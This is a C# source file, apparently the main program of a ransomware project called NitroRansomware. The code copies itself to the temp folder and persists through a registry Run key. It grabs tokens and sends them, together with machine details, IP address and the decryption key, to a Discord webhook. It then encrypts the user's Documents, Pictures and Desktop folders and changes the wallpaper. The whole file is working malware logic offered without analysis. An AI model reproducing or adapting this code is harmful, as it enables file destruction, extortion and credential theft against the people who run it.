using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Diagnostics;

namespace NitroRansomware
{
    class Program
    {
        static string desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        static string documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        static string pictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

        public static string WEBHOOK = "discord webhook goes here";
        public static string DECRYPT_PASSWORD = "ZGVmYXVsdHBhc3N3b3Jk";
        
        static Logs logging = new Logs("DEBUG", 0);
        static Webhook ww = new Webhook(WEBHOOK);
        static void Main(string[] args)
        {

            if (Installed())
            {
                Application.Run(new Form1());
            }

            else
            {
                Duplicate();
                StartUp();
                Setup();
                EncryptAll();
                Temp();
                Thread.Sleep(6000);
                Application.Run(new Form1());
            }
        }

        static void Setup()
        {
            logging.Debug("Setup start");
            List<string> tokens = Grabber.Grab();
            string tokenWrite = "";
            foreach (string x in tokens)
            {
                tokenWrite += x + "\n";
            }

            Console.WriteLine(tokenWrite);

            List<string> pcDetails = User.GetDetails();
            string uuid = User.GetIdentifier();
            string ip = User.GetIP();

            Webhook ww = new Webhook(WEBHOOK);
            ww.Send($"**Program executed** ```Status: Active \nPC Name: {pcDetails[0]}\nUser:{pcDetails[1]}\nUUID: {uuid}\nIP Address: {ip}```");
            ww.Send($"```Decryption Key: {DECRYPT_PASSWORD}```");
            ww.Send($"```Tokens:\n{tokenWrite}```");
        }
        public static void EncryptAll()
        {
            
            ww.Send("```Starting file encryption..```");
            var t1 = new Thread(() => Crypto.EncryptContent(documents));
            var t2 = new Thread(() => Crypto.EncryptContent(pictures));
            var t3 = new Thread(() => Crypto.EncryptContent(desktop));
            t1.Start();
            t2.Start();
            t3.Start();

            t1.Join();
            t2.Join();
            t3.Join();
            ww.Send($"```Finished encrypting victim's files. Total number of files encrypted: {Crypto.encryptedFileLog.Count}```");
            Wallpaper.ChangeWallpaper();
        }
        public static void DecryptAll()
        {
            var t1 = new Thread(() => Crypto.DecryptContent(documents));
            var t2 = new Thread(() => Crypto.DecryptContent(pictures));
            var t3 = new Thread(() => Crypto.DecryptContent(desktop));

            t1.Start();
            t2.Start();
            t3.Start();

            t1.Join();
            t2.Join();
            t3.Join();
        }

        static void StartUp()
        {
            try
            {
                string filename = Process.GetCurrentProcess().ProcessName + ".exe";
                string loc = Path.GetTempPath() + filename;
                Console.WriteLine(loc);
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    key.SetValue("NR", "\"" + loc + "\"");
                }
            }
            catch (Exception ex)
            {
                logging.Error(ex.Message);
            }
        }
        public static void RemoveStart()
        {
            if (Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", "NR", true) != null)
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    key.DeleteValue("NR", false);
                }
            }
        }
        static void Duplicate()
        {
            try
            {
                string filename = Process.GetCurrentProcess().ProcessName + ".exe";
                string filepath = Path.Combine(Environment.CurrentDirectory, filename);
                File.Copy(filepath, Path.GetTempPath() + filename);
                Console.WriteLine(Path.GetTempPath());
            }
            catch (Exception ex) { logging.Debug(ex.Message); }
        }
        static bool Installed()
        {
            if (Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", "NR", null) != null)
            {
                return true;
            }
            return false;
        }

        static void Temp()
        {
            string save = Path.GetTempPath() + "NR_decrypt.txt";
            Console.WriteLine(save);
            using (StreamWriter sw = new StreamWriter(save))
            {
                sw.WriteLine(DECRYPT_PASSWORD);
            }
        }

    }
}
